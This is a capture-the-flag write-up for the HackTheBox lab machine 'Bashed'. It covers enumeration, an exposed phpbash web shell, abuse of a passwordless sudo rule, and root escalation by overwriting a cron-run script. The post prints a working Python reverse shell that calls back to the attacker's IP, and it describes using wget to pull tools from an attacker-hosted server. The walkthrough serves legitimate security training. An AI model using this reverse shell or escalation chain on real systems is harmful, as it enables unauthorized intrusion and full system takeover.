---
layout: post
title:  "HackTheBox - Bashed Writeup"
categories: [HackTheBox]
tags: [pentesting]
draft: false
---

# Introduction

This is a writeup for the machine "Bashed" (10.10.10.68) on the platform HackTheBox. HackTheBox is a penetration testing labs platform so aspiring pen-testers & pen-testers can practice their hacking skills in a variety of different scenarios.

## Enumeration

### NMAP

We start off with our two nmap scans, TCP & UDP however, in this boxes case we only got information returned on TCP so we will only analyse the output for the TCP scan in this post.

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-31 21:19 BST
Nmap scan report for 10.10.10.68
Host is up (0.040s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

As you can see, we only have port 80 running, as mentioned I did also run a UDP scan however there was nothing open on UDP so let's move onto our web enumeration process and work out where to go from there.

### HTTP

As usual I started off with a dirb scan against the target using `dirb http://10.10.10.68/` and I left that running, after a while we returned the following results.

```
dirb http://10.10.10.68

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri May 31 21:23:08 2019
URL_BASE: http://10.10.10.68/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.68/ ----
==> DIRECTORY: http://10.10.10.68/css/
==> DIRECTORY: http://10.10.10.68/dev/
==> DIRECTORY: http://10.10.10.68/fonts/
==> DIRECTORY: http://10.10.10.68/images/
+ http://10.10.10.68/index.html (CODE:200|SIZE:7743)
==> DIRECTORY: http://10.10.10.68/js/
==> DIRECTORY: http://10.10.10.68/php/
+ http://10.10.10.68/Server-status (CODE:403|SIZE:299)
==> DIRECTORY: http://10.10.10.68/uploads/
```

There's a few interesting locations here `/dev`, `/uploads` and `/php`, we will remember those for later, let's take a brief look at the page itself and see what we can find on there.

![Screenshot of Bashed](/assets/images/2019-06-01-Bashed/Bashed.png)

As soon as we visit the site we find an interesting link to another page called "phpbash" this looks very interesting indeed. Let's follow the link and see what the page is all about.

![phpbashed](/assets/images/2019-06-01-Bashed/phpbashed.png)

Oh look! It's a php web-shell tool! That looks interesting indeed. Okay, let's go back to our directories we found earlier and go through them one by one, starting with `/dev`. Right away we see two php scripts both referencing this `phpbashed` tool. Okay, let's click the `phpbash.php` and see what happens.

![webshell](/assets/images/2019-06-01-Bashed/webshell.png)

Hah, so we've now got a web-shell, nice! So, we're in `www-data` as can be expected. We want to try and get ourselves to root now, but first, let's see if we can grab the user flag from here. So, we were able to navigate to the home directory of `Arrexel` who's a user and grab the `user.txt` that's good! Half the box done. There is also another user, `scriptmanager` however navigating to his home directory is no-use as there is nothing there.

## User Exploitation

So, we want to try and figure out how we can get root, in order to do this the first thing I tend to do is run LinEnum.sh against the target, so let's get LinEnum on the box in the same fashion as always. We'll first run `python -m SimpleHTTPServer 8000` on our machine in the directory that is storing LinEnum, then on the target we're going to run `wget http://[ip]:[port]/[file]`. We will save LinEnum.sh into the `/tmp` directory and give it execute permissions with `chmod +x LinEnum.sh`. For the purpose of saving space I've cut out a lot of information.

```
[00;31m#########################################################[00m
[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
[00;31m#########################################################[00m
[00;33m# www.rebootuser.com[00m
[00;33m# version 0.96[00m

[-] Debug Info
[00;33m[+] Thorough tests = Disabled[00m


[00;33mScan started at:
Sat Jun 1 10:39:09 PDT 2019
[00m

[00;33m### SYSTEM ##############################################[00m
[00;31m[-] Kernel information:[00m
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


[00;31m[-] Kernel information (continued):[00m
Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017


[00;31m[-] Specific release information:[00m
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

[00;31m[-] Hostname:[00m
bashed

[00;33m### USER/GROUP ##########################################[00m
[00;31m[-] Current user/group info:[00m
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[00;31m[-] Group memberships:[00m
uid=0(root) gid=0(root) groups=0(root)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)

[00;31m[-] It looks like we have some admin users:[00m
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)

[00;31m[-] Super user account(s):[00m
root

[00;33m[+] We can sudo without supplying a password![00m
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL

[00;31m[-] Accounts that have recently used sudo:[00m
/home/arrexel/.sudo_as_admin_successful

[00;33m### SCAN COMPLETE ####################################[00m
```

We should notice two things here very quickly baed on the output from LinEnum. The first thing that we should notice is that we can sudo without supplying a password.

```
[00;33m[+] We can sudo without supplying a password![00m
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
```

The second thing we should notice is that as `www-data` we can run any commands as `scriptmanager`, this is poor configuration in a Linux environment.

```
User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Now that we know we can run any commands as scriptmanager, let's test this out. If we run a `sudo -u scriptmanager whoami` we return `scriptmanager` as the user, the problem is this is not persistent. So if I run this command then run a `whoami` again, I'm still `www-data`, this isn't helpful! We want full priv-esc! In order to get a persistent shell we're going to need to reverse shell.

I did try a few different shells from Pentestmonkey, I first tried a pure bash shell, then a netcat shell however, none of these worked so I tried to find a directory I could write to for example in my case I used `/uploads` and then uploaded a PHP shell there using SimpleHTTPServer & wget. Once we get a reverse shell using our PHP shell we can finally move onto escalation.

## Privilege Escalation

To privilege escalate to root we're first going to escalate to Scriptmanager using `sudo -u scriptmanager bash` as we established earlier, we can run any commands as scriptmanager without a password so we're now the scriptmanager user without needing a password and we've got a shell as the scriptmanager user.

```
www-data@bashed:/$ sudo -u scriptmanager bash
sudo -u scriptmanager bash
scriptmanager@bashed:/$ 
```

Let's work on root! If we do an `ls` we see an interesting directory `scripts`, if we navigate into this directory and do an `ls -la` we see two files, one is a python script & another is a text file, however the text file is owned by root - this could be our priv-esc path!

```
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jun  2 07:37 test.txt
```

Let's first check out what the script is doing by using `cat test.py`

```
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

Okay, it looks like it just opens the text file with `write`, writes a string and then closes the file. What we're going to try and do is replace the current Python script with a python reverse shell from pentestmonkey. So we're going to take the below code and paste it into our `test.py`

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.14",1234))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Open a listener on your machine and wait a minute, after a minute you will get a shell as root, from there you can `cat` the root flag and you're done!
